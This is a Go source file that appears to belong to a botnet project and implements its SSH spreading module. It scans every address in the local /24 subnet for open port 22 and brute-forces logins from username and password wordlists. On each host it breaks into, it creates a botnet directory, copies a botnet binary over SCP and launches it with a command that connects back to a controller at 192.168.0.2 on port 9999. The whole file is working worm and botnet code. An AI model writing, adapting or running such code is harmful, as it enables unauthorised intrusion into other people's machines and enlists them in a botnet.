package ssh

import (
	"fmt"
	"io/ioutil"
	"net"
	"strings"

	"sync"

	"gitlab.com/rodzzlessa24/botnet/scanner"
	"golang.org/x/crypto/ssh"
)

// Attack holds all the shared properties needed to attack a SSH connection
type Attack struct {
	// UsernameFile is the path to usernames file
	UsernameFile string
	// PasswordFileis the path to password file
	PasswordFile string

	wg *sync.WaitGroup
}

type credential struct {
	username string
	password string
	host     string
	port     string
}

// Run is
func (a *Attack) Run() {
	if a.wg == nil {
		a.wg = new(sync.WaitGroup)
	}

	localIP := getLocalIP()
	blocal := strings.Split(localIP, ".")

	var hs []string

	for i := 0; i < 255; i++ {
		hs = append(hs, fmt.Sprintf("%s.%s.%s.%d", blocal[0], blocal[1], blocal[2], i))
	}

	s := scanner.Scanner{}

	hosts := s.ScanHosts(hs)

	// check if ip address has port 22 for ssh
	for host := range hosts {
		port := strings.Split(host, ":")[1]
		addr := strings.Split(host, ":")[0]
		if port == "22" && addr != localIP {
			fmt.Println("[*] starting brute force for", host)
			a.wg.Add(1)
			go a.bruteForce(host)
		}
	}

	a.wg.Wait()
}

// BruteForce is
func (a *Attack) bruteForce(host string) {
	defer a.wg.Done()

	usernames, err := getContent(a.UsernameFile)
	if err != nil {
		fmt.Println(err)
		return
	}
	passwords, err := getContent(a.PasswordFile)
	if err != nil {
		fmt.Println(err)
		return
	}
	var found = false
	c := new(credential)
	for _, u := range usernames {
		found = false
		for _, p := range passwords {
			if err := a.login(host, u, p); err != nil {
				continue
			}
			c = &credential{
				username: u,
				password: p,
				host:     strings.Split(host, ":")[0],
				port:     strings.Split(host, ":")[1],
			}

			fmt.Println("[*] we are in!")

			found = true
			break
		}

		if found {
			break
		}
	}

	sess, err := getSSHSession(c.host, c.username, c.password)
	if err != nil {
		fmt.Printf("[ERROR] creating ssh session %v\n", err)
		return
	}

	// get the home path
	fmt.Println("[*] getting home directory")
	cmd := "pwd"
	out, err := sess.Output(cmd)
	if err != nil {
		fmt.Printf("[ERROR] getting home directory %v\n", err)
		return
	}
	sess.Close()

	nodeOS := "linux"
	if strings.Contains(string(out), "Users") {
		nodeOS = "osx"
	}

	// create the botnet bin path
	fmt.Println("[*] creating botnet bin dir")
	sess, err = getSSHSession(c.host, c.username, c.password)
	if err != nil {
		fmt.Printf("[ERROR] creating ssh session %v\n", err)
		return
	}
	cmd = fmt.Sprintf("mkdir %s/botnet && mkdir %s/botnet/bin", strings.TrimSpace(string(out)), strings.TrimSpace(string(out)))
	if err := sess.Start(cmd); err != nil {
		fmt.Printf("[ERROR] creating botnet dirs %v\n", err)
		return
	}
	sess.Close()

	sess, err = getSSHSession(c.host, c.username, c.password)
	if err != nil {
		fmt.Printf("[ERROR] creating ssh session %v\n", err)
		return
	}
	if err := scp(fmt.Sprintf("/Users/rodrigo/work/src/gitlab.com/rodzzlessa24/botnet/bin/%s/botnet", nodeOS), strings.TrimSpace(string(out))+"/botnet/bin", sess); err != nil {
		fmt.Printf("[ERROR] sending botnet binary %v\n", err)
		return
	}

	// execute botnet client
	sess, err = getSSHSession(c.host, c.username, c.password)
	if err != nil {
		fmt.Printf("[ERROR] creating ssh session %v\n", err)
		return
	}
	cmd = strings.TrimSpace(string(out)) + "/botnet/bin/botnet -target 192.168.0.2 -port 9999 connect"
	if err := a.execute(cmd, sess); err != nil {
		fmt.Printf("[ERROR] executing botnet %v\n", err)
		return
	}
}

func (a *Attack) execute(cmd string, sess *ssh.Session) error {
	fmt.Println("[*] starting botnet on remote machine...")
	if err := sess.Start(cmd); err != nil {
		return err
	}

	return nil
}

// Login is
func (a *Attack) login(host, username, password string) error {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
	}

	_, err := ssh.Dial("tcp", host, config)
	if err != nil {
		return err
	}

	return nil
}

func getContent(file string) ([]string, error) {
	f, err := ioutil.ReadFile(file)
	if err != nil {
		return []string{}, fmt.Errorf("error opening file %v", err)
	}

	results := strings.Split(string(f), "\n")

	return results, nil
}

func getSSHSession(host, username, password string) (*ssh.Session, error) {
	config := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
	}

	client, err := ssh.Dial("tcp", host+":22", config)
	if err != nil {
		return nil, err
	}

	// Create a new ssh session
	return client.NewSession()
}

func getLocalIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	for _, address := range addrs {
		// check the address type and if it is not a loopback the display it
		if ipnet, ok := address.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
			if ipnet.IP.To4() != nil {
				return ipnet.IP.String()
			}
		}
	}
	return ""
}
